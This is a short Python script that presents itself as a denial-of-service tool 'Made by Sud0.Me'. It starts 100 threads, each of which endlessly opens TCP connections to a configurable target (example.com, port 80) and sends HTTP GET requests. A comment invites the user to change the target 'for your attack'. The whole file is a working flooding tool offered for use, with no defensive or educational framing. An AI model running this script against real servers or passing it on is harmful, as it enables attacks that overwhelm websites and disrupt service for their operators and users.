# Python Dos Tool Made by Sud0.Me
import socket
import threading

# Definitions for the attack. Change them for your attack
target = "example.com"
port = 80

# Main function
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.close()
        except:
            pass

# Using threading to send requests
for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()